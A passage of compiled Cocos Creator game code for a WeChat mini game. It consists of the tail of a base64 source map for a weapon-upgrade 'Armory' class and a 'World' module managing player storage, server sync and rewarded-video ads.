FBQzlCLElBQUksSUFBSSxHQUFHLElBQUksQ0FBQyxJQUFJLENBQUMsT0FBTyxDQUFDLENBQUM7UUFDOUIsSUFBSSxJQUFJLEVBQUM7WUFDTCxPQUFPLElBQUksQ0FBQyxtQkFBbUIsQ0FBQyxDQUFDO1NBQ3BDO2FBQUs7WUFDRixPQUFPLENBQUMsQ0FBQztTQUNaO0lBQ0wsQ0FBQztJQUlELGdCQUFnQjtJQUNoQix3Q0FBdUIsR0FBdkIsVUFBd0IsT0FBYztRQUNsQyxJQUFJLElBQUksR0FBRyxJQUFJLENBQUMsSUFBSSxDQUFDLE9BQU8sQ0FBQyxDQUFDO1FBQzlCLElBQUksSUFBSSxFQUFDO1lBQ0wsT0FBTyxJQUFJLENBQUMsd0JBQXdCLENBQUMsQ0FBQztTQUN6QzthQUFLO1lBQ0YsT0FBTyxDQUFDLENBQUM7U0FDWjtJQUNMLENBQUM7SUFFRCx1Q0FBc0IsR0FBdEIsVUFBdUIsT0FBYyxFQUFFLEdBQVU7UUFDN0MsSUFBSSxJQUFJLEdBQUcsSUFBSSxDQUFDLElBQUksQ0FBQyxPQUFPLENBQUMsQ0FBQztRQUM5QixJQUFJLENBQUMsSUFBSSxFQUFDO1lBQ04sSUFBSSxHQUFHLEVBQUUsQ0FBQztZQUNWLElBQUksQ0FBQyxtQkFBbUIsQ0FBQyxHQUFHLENBQUMsQ0FBQztZQUM5QixJQUFJLENBQUMsd0JBQXdCLENBQUMsR0FBRyxDQUFDLENBQUM7WUFDbkMsSUFBSSxDQUFDLElBQUksQ0FBQyxPQUFPLENBQUMsR0FBRyxJQUFJLENBQUM7U0FDN0I7UUFDRCxJQUFJLENBQUMsbUJBQW1CLENBQUMsR0FBRyxJQUFJLENBQUMsbUJBQW1CLENBQUMsR0FBQyxHQUFHLENBQUM7UUFDMUQsYUFBSyxDQUFDLE9BQU8sQ0FBQyxNQUFNLEdBQUcsSUFBSSxDQUFDLE1BQU0sRUFBRSxDQUFDO0lBQ3pDLENBQUM7SUFFRCwyQ0FBMEIsR0FBMUIsVUFBMkIsT0FBYyxFQUFFLEdBQVU7UUFDakQsSUFBSSxJQUFJLEdBQUcsSUFBSSxDQUFDLElBQUksQ0FBQyxPQUFPLENBQUMsQ0FBQztRQUM5QixJQUFJLENBQUMsSUFBSSxFQUFDO1lBQ04sSUFBSSxHQUFHLEVBQUUsQ0FBQztZQUNWLElBQUksQ0FBQyxtQkFBbUIsQ0FBQyxHQUFHLENBQUMsQ0FBQztZQUM5QixJQUFJLENBQUMsd0JBQXdCLENBQUMsR0FBRyxDQUFDLENBQUM7WUFDbkMsSUFBSSxDQUFDLElBQUksQ0FBQyxPQUFPLENBQUMsR0FBRyxJQUFJLENBQUM7U0FDN0I7UUFDRCxJQUFJLENBQUMsd0JBQXdCLENBQUMsR0FBRyxJQUFJLENBQUMsd0JBQXdCLENBQUMsR0FBRyxHQUFHLENBQUM7UUFDdEUsYUFBSyxDQUFDLE9BQU8sQ0FBQyxNQUFNLEdBQUcsSUFBSSxDQUFDLE1BQU0sRUFBRSxDQUFDO0lBQ3pDLENBQUM7SUFFRCx1QkFBTSxHQUFOO1FBQ0ksT0FBTyxJQUFJLENBQUMsU0FBUyxDQUFDLElBQUksQ0FBQyxJQUFJLENBQUMsQ0FBQztJQUNyQyxDQUFDO0lBQ0wsYUFBQztBQUFELENBOUlBLEFBOElDLElBQUEiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyJcclxuaW1wb3J0IHtXb3JsZH0gZnJvbSBcIi4vV29ybGRcIjtcclxuaW1wb3J0IHtFeGNlbENvbmZpZ30gZnJvbSBcIi4uLy4uLy4uL2ZyYW1ld29yay9jb25maWcvRXhjZWxDb25maWdcIjtcclxuaW1wb3J0IHtFeGNlbFRhYmxlTmFtZXN9IGZyb20gXCIuLi9jb25maWcvRXhjZWxUYWJsZU5hbWVzXCI7XHJcblxyXG5jb25zdCBFTUlUVEVSX1BPV0VSX0xFVkVMID0gXCJwb3dlckx2XCI7XHJcbmNvbnN0IEVNSVRURVJfRklSRV9QT1dFUl9MRVZFTCA9IFwiZmlyZVBvd2VyTHZcIjtcclxuXHJcbi8vIGNvbnN0IFBPV0VSX01VTFMgPSBbMSwyLDIsNCwyLDQsNiw2LDYsNiw2XTtcclxuY29uc3QgUEFZTE9BRF9NVUxTID0gWzEsMSwxMCwyLDUsMTAsMSwxLDEsMSwxXTtcclxuXHJcbi8qKiDor5XnlKjliqA1MOe6pyAqL1xyXG5jb25zdCBUUklBTF9BREQgPSA1MDtcclxuXHJcbi8qKiDmrablmajlupMgKi9cclxuZXhwb3J0IGRlZmF1bHQgY2xhc3MgQXJtb3J5IHtcclxuXHJcbiAgICBjb25zdHJ1Y3RvcihtYXApe1xyXG4gICAgICAgIHRoaXMuX21hcCA9IG1hcDtcclxuICAgICAgICB0aGlzLl93ZWFwb25VcENmZyA9IEV4Y2VsQ29uZmlnLmdldEV4Y2VsVGFibGUoRXhjZWxUYWJsZU5hbWVzLldlYXBvblVwKTtcclxuICAgICAgICB0aGlzLl9idWxsZXRVcENmZyA9IEV4Y2VsQ29uZmlnLmdldEV4Y2VsVGFibGUoRXhjZWxUYWJsZU5hbWVzLkJ1bGxldFVwKTtcclxuICAgIH1cclxuXHJcbiAgICBwcml2YXRlIF9tYXA6W251bWJlciwgbnVtYmVyXSA9IG51bGw7XHJcbiAgICBwcml2YXRlIF93ZWFwb25VcENmZzphbnkgPSBudWxsO1xyXG4gICAgcHJpdmF0ZSBfYnVsbGV0VXBDZmc6YW55ID0gbnVsbDtcclxuXHJcblxyXG4gICAgLyoqIOS8pOWus+WKoOaIkCAqL1xyXG4gICAgaHVydE11bE9mKGVtaXR0ZXI6bnVtYmVyKXtcclxuICAgICAgICBsZXQgYmFzZU11bCA9IHRoaXMuX3dlYXBvblVwQ2ZnW1dvcmxkLlN0b3JhZ2UuQURMdi0xXVsnZmlnaHQnXTtcclxuICAgICAgICBpZiAoZW1pdHRlciA9PSAxKXtcclxuICAgICAgICAgICAgcmV0dXJuIGJhc2VNdWw7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIGxldCBsdiA9IHRoaXMubGV2ZWxPZkVtaXR0ZXJQb3dlcihlbWl0dGVyKTtcclxuICAgICAgICBpZiAoZW1pdHRlciA9PSBXb3JsZC5TdG9yYWdlLnVubG9ja0d1bil7XHJcbiAgICAgICAgICAgIGx2ICs9IFRSSUFMX0FERDtcclxuICAgICAgICAgICAgaWYgKGx2ID4gdGhpcy5fd2VhcG9uVXBDZmcubGVuZ3RoKXtcclxuICAgICAgICAgICAgICAgIGx2ID0gdGhpcy5fd2VhcG9uVXBDZmcubGVuZ3RoO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgfVxyXG4gICAgICAgIHJldHVybiB0aGlzLl93ZWFwb25VcENmZ1tsdi0xXVsnaHVydF9hZGQnXSAqIGJhc2VNdWw7XHJcbiAgICB9XHJcblxyXG4gICAgLyoqIOW8ueWuuemHj+e0r+WKoCAqL1xyXG4gICAgcGF5bG9hZEFkZE9mKGVtaXR0ZXI6bnVtYmVyKXtcclxuICAgICAgICBpZiAoZW1pdHRlciA9PSAxKXJldHVybiAwO1xyXG4gICAgICAgIGxldCBsdiA9IHRoaXMubGV2ZWxPZkVtaXR0ZXJGaXJlUG93ZXIoZW1pdHRlcik7XHJcbiAgICAgICAgaWYgKGVtaXR0ZXIgPT0gV29ybGQuU3RvcmFnZS51bmxvY2tHdW4pe1xyXG4gICAgICAgICAgICBsdiArPSBUUklBTF9BREQ7XHJcbiAgICAgICAgICAgIGlmIChsdiA+IHRoaXMuX3dlYXBvblVwQ2ZnLmxlbmd0aCl7XHJcbiAgICAgICAgICAgICAgICBsdiA9IHRoaXMuX3dlYXBvblVwQ2ZnLmxlbmd0aDtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH1cclxuICAgICAgICByZXR1cm4gdGhpcy5fYnVsbGV0VXBDZmdbbHYtMV1bXCJndW5fXCIrKFwiMDAwXCIrZW1pdHRlcikuc3Vic3RyKC0zKV07XHJcbiAgICB9XHJcblxyXG4gICAgLyoqIOWPkeWwhOmikeeOh+WKoOaIkCAqL1xyXG4gICAgZnJlTXVsT2YoZW1pdHRlcjpudW1iZXIpe1xyXG4gICAgICAgIGxldCBpbmRleCA9IDA7XHJcbiAgICAgICAgaWYgKGVtaXR0ZXIgPT0gMSl7XHJcbiAgICAgICAgICAgIGluZGV4ID0gV29ybGQuU3RvcmFnZS5BREx2LTE7XHJcbiAgICAgICAgfWVsc2Uge1xyXG4gICAgICAgICAgICBsZXQgbHYgPSB0aGlzLmxldmVsT2ZFbWl0dGVyRmlyZVBvd2VyKGVtaXR0ZXIpO1xyXG4gICAgICAgICAgICBpZiAoZW1pdHRlciA9PSBXb3JsZC5TdG9yYWdlLnVubG9ja0d1bil7XHJcbiAgICAgICAgICAgICAgICBsdiArPSBUUklBTF9BREQ7XHJcbiAgICAgICAgICAgICAgICBpZiAobHYgPiB0aGlzLl93ZWFwb25VcENmZy5sZW5ndGgpe1xyXG4gICAgICAgICAgICAgICAgICAgIGx2ID0gdGhpcy5fd2VhcG9uVXBDZmcubGVuZ3RoO1xyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIGluZGV4ID0gbHYgLSAxO1xyXG4gICAgICAgIH1cclxuICAgICAgICByZXR1cm4gdGhpcy5fd2VhcG9uVXBDZmdbaW5kZXhdWydmcmUnXTtcclxuICAgIH1cclxuXHJcbiAgICAvKiog5bCE56iL5Yqg5oiQICovXHJcbiAgICByYW5nZU11bE9mKGVtaXR0ZXI6bnVtYmVyKXtcclxuICAgICAgICBpZiAoZW1pdHRlciA9PSA0IHx8IGVtaXR0ZXIgPT0gNSl7XHJcbiAgICAgICAgICAgIGxldCBsdiA9IHRoaXMubGV2ZWxPZkVtaXR0ZXJQb3dlcihlbWl0dGVyKTtcclxuICAgICAgICAgICAgaWYgKGVtaXR0ZXIgPT0gV29ybGQuU3RvcmFnZS51bmxvY2tHdW4pe1xyXG4gICAgICAgICAgICAgICAgbHYgKz0gVFJJQUxfQUREO1xyXG4gICAgICAgICAgICAgICAgaWYgKGx2ID4gdGhpcy5fd2VhcG9uVXBDZmcubGVuZ3RoKXtcclxuICAgICAgICAgICAgICAgICAgICBsdiA9IHRoaXMuX3dlYXBvblVwQ2ZnLmxlbmd0aDtcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICByZXR1cm4gdGhpcy5fd2VhcG9uVXBDZmdbbHYgLSAxXVsncmFuZ2VfYWRkJ107XHJcbiAgICAgICAgfWVsc2Uge1xyXG4gICAgICAgICAgICByZXR1cm4gMTtcclxuICAgICAgICB9XHJcbiAgICB9XHJcblxyXG4gICAgLyoqIOaUvuWkp+WKoOaIkCAqL1xyXG4gICAgbWFnbmlmeU11bChlbWl0dGVyOm51bWJlcil7XHJcbiAgICAgICAgaWYgKGVtaXR0ZXIgPT0gMiB8fCBlbWl0dGVyID09IDkgfHwgZW1pdHRlciA9PSAxMCl7XHJcbiAgICAgICAgICAgIGxldCBsdiA9IHRoaXMubGV2ZWxPZkVtaXR0ZXJQb3dlcihlbWl0dGVyKTtcclxuICAgICAgICAgICAgaWYgKGVtaXR0ZXIgPT0gV29ybGQuU3RvcmFnZS51bmxvY2tHdW4pe1xyXG4gICAgICAgICAgICAgICAgbHYgKz0gVFJJQUxfQUREO1xyXG4gICAgICAgICAgICAgICAgaWYgKGx2ID4gdGhpcy5fd2VhcG9uVXBDZmcubGVuZ3RoKXtcclxuICAgICAgICAgICAgICAgICAgICBsdiA9IHRoaXMuX3dlYXBvblVwQ2ZnLmxlbmd0aDtcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICByZXR1cm4gdGhpcy5fd2VhcG9uVXBDZmdbbHYgLSAxXVsnYW1wX2FkZCddO1xyXG4gICAgICAgIH0gZWxzZSB7XHJcbiAgICAgICAgICAgIHJldHVybiAxO1xyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcblxyXG4gICAgLyoqIOiOt+WPluatpuWZqOeahOWogeWKm+WKoOaIkCAqL1xyXG4gICAgbGV2ZWxPZkVtaXR0ZXJQb3dlcihlbWl0dGVyOm51bWJlcil7XHJcbiAgICAgICAgbGV0IGRhdGEgPSB0aGlzLl9tYXBbZW1pdHRlcl07XHJcbiAgICAgICAgaWYgKGRhdGEpe1xyXG4gICAgICAgICAgICByZXR1cm4gZGF0YVtFTUlUVEVSX1BPV0VSX0xFVkVMXTtcclxuICAgICAgICB9ZWxzZSB7XHJcbiAgICAgICAgICAgIHJldHVybiAxO1xyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcbiAgICBcclxuXHJcbiAgICAvKiog6I635Y+W5q2m5Zmo55qE54Gr5Yqb5Yqg5oiQICovXHJcbiAgICBsZXZlbE9mRW1pdHRlckZpcmVQb3dlcihlbWl0dGVyOm51bWJlcil7XHJcbiAgICAgICAgbGV0IGRhdGEgPSB0aGlzLl9tYXBbZW1pdHRlcl07XHJcbiAgICAgICAgaWYgKGRhdGEpe1xyXG4gICAgICAgICAgICByZXR1cm4gZGF0YVtFTUlUVEVSX0ZJUkVfUE9XRVJfTEVWRUxdO1xyXG4gICAgICAgIH1lbHNlIHtcclxuICAgICAgICAgICAgcmV0dXJuIDE7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG5cclxuICAgIGFkZExldmVsT2ZFbWl0dGVyUG93ZXIoZW1pdHRlcjpudW1iZXIsIGFkZDpudW1iZXIpe1xyXG4gICAgICAgIGxldCBkYXRhID0gdGhpcy5fbWFwW2VtaXR0ZXJdO1xyXG4gICAgICAgIGlmICghZGF0YSl7XHJcbiAgICAgICAgICAgIGRhdGEgPSB7fTtcclxuICAgICAgICAgICAgZGF0YVtFTUlUVEVSX1BPV0VSX0xFVkVMXSA9IDE7XHJcbiAgICAgICAgICAgIGRhdGFbRU1JVFRFUl9GSVJFX1BPV0VSX0xFVkVMXSA9IDE7XHJcbiAgICAgICAgICAgIHRoaXMuX21hcFtlbWl0dGVyXSA9IGRhdGE7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIGRhdGFbRU1JVFRFUl9QT1dFUl9MRVZFTF0gPSBkYXRhW0VNSVRURVJfUE9XRVJfTEVWRUxdK2FkZDtcclxuICAgICAgICBXb3JsZC5TdG9yYWdlLmFybW9yeSA9IHRoaXMudG9Kc29uKCk7XHJcbiAgICB9XHJcblxyXG4gICAgYWRkTGV2ZWxPZkVtaXR0ZXJGaXJlUG93ZXIoZW1pdHRlcjpudW1iZXIsIGFkZDpudW1iZXIpe1xyXG4gICAgICAgIGxldCBkYXRhID0gdGhpcy5fbWFwW2VtaXR0ZXJdO1xyXG4gICAgICAgIGlmICghZGF0YSl7XHJcbiAgICAgICAgICAgIGRhdGEgPSB7fTtcclxuICAgICAgICAgICAgZGF0YVtFTUlUVEVSX1BPV0VSX0xFVkVMXSA9IDE7XHJcbiAgICAgICAgICAgIGRhdGFbRU1JVFRFUl9GSVJFX1BPV0VSX0xFVkVMXSA9IDE7XHJcbiAgICAgICAgICAgIHRoaXMuX21hcFtlbWl0dGVyXSA9IGRhdGE7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIGRhdGFbRU1JVFRFUl9GSVJFX1BPV0VSX0xFVkVMXSA9IGRhdGFbRU1JVFRFUl9GSVJFX1BPV0VSX0xFVkVMXSArIGFkZDtcclxuICAgICAgICBXb3JsZC5TdG9yYWdlLmFybW9yeSA9IHRoaXMudG9Kc29uKCk7XHJcbiAgICB9XHJcblxyXG4gICAgdG9Kc29uKCl7XHJcbiAgICAgICAgcmV0dXJuIEpTT04uc3RyaW5naWZ5KHRoaXMuX21hcCk7XHJcbiAgICB9XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/info/World.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '1fe1d3cS4ZOUpBrBhZxt6l/', 'World');
// script/app/info/World.ts

Object.defineProperty(exports, "__esModule", { value: true });
exports.World = void 0;
var LocalStorage_1 = require("../../../framework/persistence/LocalStorage");
var Network_1 = require("../network/Network");
var NetworkConfig_1 = require("../config/NetworkConfig");
var Armory_1 = require("./Armory");
var PropInfo_1 = require("./PropInfo");
var Newbies_1 = require("./Newbies");
var GameSupply_1 = require("../game/GameSupply");
var RecommendPropsController_1 = require("../home/RecommendPropsController");
var RecommendController_1 = require("../home/RecommendController");
var PropsItemController_1 = require("../home/PropsItemController");
var GameOver_1 = require("../game/GameOver");
var JackpotController_1 = require("../home/JackpotController");
var GameRelive_1 = require("../game/GameRelive");
var HomeController_1 = require("../home/HomeController");
/*
    视频事件记录
    1、道具推荐 【click】RecommendPropsController Use
    2、道具使用 【click】PropsItemController Use
    3、装备推荐 【click】RecommendController Use
    4、装备补给 【click】GameSupply UseSupply
    5、幸运大奖 【Click】GameOver onGameOverTake
    6、多倍金币 【click】JackpotController _takeIt     3
    7、复活 【click】GameRelive Relive
    8、高爆武器开局  【click】HomeController WeaponStart
*/
var World;
(function (World) {
    /** 能量最高值 */
    World.POWER_MAX = 999;
    /** 金币最高等级 */
    World.GOLDLV_MAX = 999;
    /** 日常收益最高等级 */
    World.DAYEARN_MAX = 999;
    /** 分享上限 */
    World.SHARE_REWARD_MAX = 100;
    // 调用方法
    var gameSupply = new GameSupply_1.default();
    var recommendPropsController = new RecommendPropsController_1.default();
    var recommendController = new RecommendController_1.default();
    var propsItemController = new PropsItemController_1.default();
    var gameOver = new GameOver_1.default();
    var jackpotController = new JackpotController_1.default();
    var gameRelive = new GameRelive_1.default();
    var homeController = new HomeController_1.default();
    var My = /** @class */ (function () {
        function My() {
        }
        Object.defineProperty(My, "serverTime", {
            get: function () {
                var t = new Date().getTime();
                return this._serverTime + t - this._localTime;
            },
            set: function (value) {
                this._localTime = new Date().getTime();
                this._serverTime = value;
            },
            enumerable: false,
            configurable: true
        });
        Object.defineProperty(My, "armory", {
            get: function () {
                if (!this._armory) {
                    this._armory = new Armory_1.default(JSON.parse(World.Storage.armory));
                }
                return this._armory;
            },
            enumerable: false,
            configurable: true
        });
        Object.defineProperty(My, "propInfo", {
            get: function () {
                if (!this._propInfo) {
                    this._propInfo = new PropInfo_1.default(JSON.parse(World.Storage.props));
                }
                return this._propInfo;
            },
            enumerable: false,
            configurable: true
        });
        Object.defineProperty(My, "newbies", {
            get: function () {
                if (!this._newbies) {
                    this._newbies = new Newbies_1.default(JSON.parse(World.Storage.newbies));
                }
                return this._newbies;
            },
            enumerable: false,
            configurable: true
        });
        /** 玩家id */
        My.playerId = 0;
        /** 皮肤id */
        My.skinId = 1;
        /** 道具数量 */
        // public static diamond:number = 0;
        // /** 最高分 */
        // public static bestScore:number = 0;
        //
        // /** 当前关卡 */
        // public static level = 30;
        /** 本地时间 */
        My._localTime = 0;
        /** 服务器时间 */
        My._serverTime = 0;
        /** 武器库 */
        My._armory = null;
        /** 道具库 */
        My._propInfo = null;
        /** 新手引导 */
        My._newbies = null;
        return My;
    }());
    World.My = My;
    /** 更新Storage的key */
    World.updateStorageKeys = [];
    World.pushStorageKeys = [];
    /******************* 以下数据为客户端自己管理，初始值就是默认值 **********************/
    var Storage = /** @class */ (function () {
        function Storage() {
        }
        Storage.init = function () {
            var _this = this;
            var updataKVData = LocalStorage_1.LocalStorage.getString("updateKVData");
            if (updataKVData != null && updataKVData != "") {
                World.updateStorageKeys = JSON.parse(updataKVData);
                World.updateStorageKeys.forEach(function (value) {
                    if (typeof _this["_" + value] == "number") {
                        _this["_" + value] = LocalStorage_1.LocalStorage.getNumber(value);
                    }
                    else if (typeof _this["_" + value] == "string") {
                        _this["_" + value] = LocalStorage_1.LocalStorage.getString(value);
                    }
                    else if (typeof _this["_" + value] == "boolean") {
                        _this["_" + value] = LocalStorage_1.LocalStorage.getBoolean(value);
                    }
                    else {
                        console.error("key=" + value + " type=" + typeof _this["_" + value]);
                    }
                });
            }
            // 测试
            gameSupply.onTest();
            this.initVideoAd();
        };
        // 初始化激励视频
        Storage.initVideoAd = function () {
            var _this = this;
            console.log("initVideoAd");
            this._videoAd = wx.createRewardedVideoAd({
                adUnitId: "adunit-82fe18506461f029"
            });
            this._videoAd.onError(function (res) {
                console.log("videoAd onError", res);
            });
            this._videoAd.onClose(function (res) {
                if (res && res.isEnded || res === undefined) {
                    _this.videoAd_do();
                }
                else {
                    // 关闭
                }
            });
        };
        // 展示激励视频
        Storage.videoAd_show = function () {
            var _this = this;
            console.log("videoAd_show");
            this._videoAd.show().catch(function () {
                // 失败重试
                _this._videoAd.load()
                    .then(function () { return _this._videoAd.show(); })
                    .catch(function (err) {
                    _this.videoAd_do();
                    console.log('激励视频 广告显示失败', err);
                });
            });
            this._videoAd.load();
        };
        // 视频处理事件
        Storage.videoAd_do = function () {
            console.log("videoAd_do:", this._videoSign);
            if (this._videoSign == 1) {
                cc.game.emit("video_1");
            }
            else if (this._videoSign == 2) {
                cc.game.emit("video_2");
            }
            else if (this._videoSign == 3) {
                cc.game.emit("video_3");
            }
            else if (this._videoSign == 4) {
                cc.game.emit("video_4");
            }
            else if (this._videoSign == 5) {
                cc.game.emit("video_5");
            }
            else if (this._videoSign == 6) {
                cc.game.emit("video_6");
            }
            else if (this._videoSign == 7) {
                cc.game.emit("video_7");
            }
            else if (this._videoSign == 8) {
                cc.game.emit("video_8");
            }
            this._videoSign = 0;
        };
        Storage.allKeys = function () {
            var keys = [];
            for (var key in Storage) {
                if (key.startsWith('_')) {
                    var k = key.substring(1);
                    keys.push(k);
                }
            }
            return keys;
        };
        Storage.updateKVData = function (key, value) {
            if (!World.updateStorageKeys.includes(key)) {
                World.updateStorageKeys.push(key);
            }
            if (typeof value == "number") {
                LocalStorage_1.LocalStorage.setNumber(key, value);
            }
            else if (typeof value == "boolean") {
                LocalStorage_1.LocalStorage.setBoolean(key, value);
            }
            else if (typeof value == "string") {
                LocalStorage_1.LocalStorage.setString(key, value);
            }
            LocalStorage_1.LocalStorage.setString("updateKVData", JSON.stringify(World.updateStorageKeys.concat(World.pushStorageKeys.filter(function (value1) { return !World.updateStorageKeys.includes(value1); }))));
            cc.find('Canvas').emit("UpdateStorage", key);
            if (NetworkConfig_1.NetworkConfig.connectServer) {
                this.modifyCount++;
                if (this.modifyCount > this.maxModify) {
                    this.modifyCount = 0;
                    Network_1.default.pushStorage();
                }
            }
        };
        Object.defineProperty(Storage, "gameLevel", {
            /** getter */
            get: function () {
                return this._gameLevel;
            },
            set: function (value) {
                if (this._gameLevel != value) {
                    this._gameLevel = value;
                    this.updateKVData("gameLevel", value);
                }
            },
            enumerable: false,
            configurable: true
        });
        Object.defineProperty(Storage, "goldCount", {
            get: function () {
                return this._goldCount;
            },
            /**  setter  */
            set: function (value) {
                if (this._goldCount != value) {
                    this._goldCount = value;
                    this.updateKVData("goldCount", value);
                }
            },
            enumerable: false,
            configurable: true
        });
        Object.defineProperty(Storage, "diamondCount", {
            get: function () {
                return this._diamondCount;
            },
            set: function (value) {
                if (this._diamondCount != value) {
                    this._diamondCount = value;
                    this.updateKVData("diamondCount", value);
                }
            },
            enumerable: false,
            configurable: true
        });
        Object.defineProperty(Storage, "goldLv", {
            get: function () {
                return this._goldLv;
            },
            set: function (value) {
                if (this._goldLv != value) {
                    this._goldLv = value;
                    this.updateKVData("goldLv", value);
                }
            },
            enumerable: false,
            configurable: true
        });
        Object.defineProperty(Storage, "dayEarnLv", {
            get: function () {
                return this._dayEarnLv;
            },
            set: function (value) {
                if (this._dayEarnLv != value) {
                    this._dayEarnLv = value;
                    this.updateKVData("dayEarnLv", value);
                }
            },
            enumerable: false,
            configurable: true
        });
        Object.defineProperty(Storage, "power", {
            get: function () {
                return this._power;
            },
            set: function (value) {
                if (this._power != value) {
                    if (value > World.POWER_MAX) {
                        value = World.POWER_MAX;
                    }
                    this._power = value;
                    this.updateKVData("power", value);
                }
            },
            enumerable: false,
            configurable: true
        });
        Object.defineProperty(Storage, "powerModifyTime", {
            get: function () {
                return this._powerModifyTime;
            },
            set: function (value) {
                if (this._powerModifyTime != value) {
                    this._powerModifyTime = value;
                    this.updateKVData("powerModifyTime", value);
                }
            },
            enumerable: false,
            configurable: true
        });
        Object.defineProperty(Storage, "dayEarnTotalModifyTime", {
            get: function () {
                return this._dayEarnTotalModifyTime;
            },
            set: function (value) {
                if (this._dayEarnTotalModifyTime != value) {
                    this._dayEarnTotalModifyTime = value;
                    this.updateKVData("dayEarnTotalModifyTime", value);
                }
            },
            enumerable: false,
            configurable: true
        });
        Object.defineProperty(Storage, "dayEarnExpireTime", {
            get: function () {
                return this._dayEarnExpireTime;
            },
            set: function (value) {
                if (this._dayEarnExpireTime != value) {
                    this._dayEarnExpireTime = value;
                    this.updateKVData("dayEarnExpireTime", value);
                }
            },
            enumerable: false,
            configurable: true
        });
        Object.defineProperty(Storage, "dayEarnTotal", {
            get: function () {
                return this._dayEarnTotal;
            },
            set: function (value) {
                if (this._dayEarnTotal != value) {
                    this._dayEarnTotal = value;
                    this.dayEarnTotalModifyTime = World.My.serverTime;
                    this.updateKVData("dayEarnTotal", value);
                }
            },
            enumerable: false,
            configurable: true
        });
        Object.defineProperty(Storage, "task", {
            get: function () {
                return this._task;
            },
            set: function (value) {
                if (this._task != value) {
                    this._task = value;
                    this.updateKVData("task", value);
                }
            },
            enumerable: false,
            configurable: true
        });
        Object.defineProperty(Storage, "gameLucky", {
            get: function () {
                return this._gameLucky;
            },
            set: function (value) {
                if (this._gameLucky != value) {
                    this._gameLucky = value;
                    this.updateKVData("gameLucky", value);
                }
            },
            enumerable: false,
            configurable: true
        });
        Object.defineProperty(Storage, "gameEnergy", {
            get: function () {
                return this._gameEnergy;
            },
            set: function (value) {
                if (this._gameEnergy != value) {
                    this._gameEnergy = value;
                    this.updateKVData("gameEnergy", value);
                }
            },
            enumerable: false,
            configurable: true
        });
        Object.defineProperty(Storage, "shakeOpen", {
            get: function () {
                return this._shakeOpen;
            },
            set: function (value) {
                if (this._shakeOpen != value) {
                    this._shakeOpen = value;
                    this.updateKVData("shakeOpen", value);
                }
            },
            enumerable: false,
            configurable: true
        });
        Object.defineProperty(Storage, "armory", {
            get: function () {
                return this._armory;
            },
            set: function (value) {
                if (this._armory != value) {
                    this._armory = value;
                    this.updateKVData("armory", value);
                }
            },
            enumerable: false,
            configurable: true
        });
        Object.defineProperty(Storage, "HpLv", {
            get: function () {
                return this._HpLv;
            },
            set: function (value) {
                if (this._HpLv != value) {
                    this._HpLv = value;
                    this.updateKVData("HpLv", value);
                }
            },
            enumerable: false,
            configurable: true
        });
        Object.defineProperty(Storage, "ADLv", {
            get: function () {
                return this._ADLv;
            },
            set: function (value) {
                if (this._ADLv != value) {
                    this._ADLv = value;
                    this.updateKVData("ADLv", value);
                }
            },
            enumerable: false,
            configurable: true
        });
        Object.defineProperty(Storage, "passLuckyCount", {
            get: function () {
                return this._passLuckyCount;
            },
            set: function (value) {
                if (this._passLuckyCount != value) {
                    this._passLuckyCount = value;
                    this.updateKVData("passLuckyCount", value);
                }
            },
            enumerable: false,
            configurable: true
        });
        Object.defineProperty(Storage, "props", {
            get: function () {
                return this._props;
            },
            set: function (value) {
                if (this._props != value) {
                    this._props = value;
                    this.updateKVData("props", value);
                }
            },
            enumerable: false,
            configurable: true
        });
        Object.defineProperty(Storage, "newbies", {
            get: function () {
                return this._newbies;
            },
            set: function (value) {
                if (this._newbies != value) {
                    this._newbies = value;
                    this.updateKVData("newbies", value);
                }
            },
            enumerable: false,
            configurable: true
        });
        Object.defineProperty(Storage, "unlockGun", {
            get: function () {
                return this._unlockGun;
            },
            set: function (value) {
                if (this._unlockGun != value) {
                    this._unlockGun = value;
                    this.updateKVData("unlockGun", value);
                }
            },
            enumerable: false,
            configurable: true
        });
        /** 关卡 */
        Storage._gameLevel = 1;
        /** 金币数量 */
        Storage._goldCount = 0;
        /** 钻石数量 */
        Storage._diamondCount = 0;
        /** 金币价值等级 */
        Storage._goldLv = 1;
        /** 日常收益等级 */
        Storage._dayEarnLv = 1;
        /** 体力 */
        Storage._power = 120;
        /** 体力结算时间 */
        Storage._powerModifyTime = 0;
        /** 日常收益结算时间　*/
        Storage._dayEarnTotalModifyTime = 0;
        /** 日常收益到期时间 */
        Storage._dayEarnExpireTime = 0;
        /** 日常总收益 */
        Storage._dayEarnTotal = 0;
        /** 任务 */
        Storage._task = "{}";
        /**　游戏中转盘数据 */
        Storage._gameLucky = "{\"time\":0,\"num\":0}";
        /** 游戏中的能量 */
        Storage._gameEnergy = 0;
        /** 震动开关 */
        Storage._shakeOpen = true;
        /** 新手引导开关 */
        Storage._newbies = "{}";
        Storage.modifyCount = 0;
        Storage.maxModify = 10;
        /** 生命力 */
        Storage._HpLv = 1;
        /** 战斗力 */
        Storage._ADLv = 1;
        /** 武器库 */
        Storage._armory = "{}";
        /** lucky进度条 */
        Storage._passLuckyCount = 0;
        /** 道具有效时间 */
        Storage._props = "{}";
        /** 解锁新枪(正数表示解锁新枪，负数表示已经解锁过的新枪，0表示初始状态) */
        Storage._unlockGun = 0;
        /* 激励视频 */
        Storage._videoAd = null;
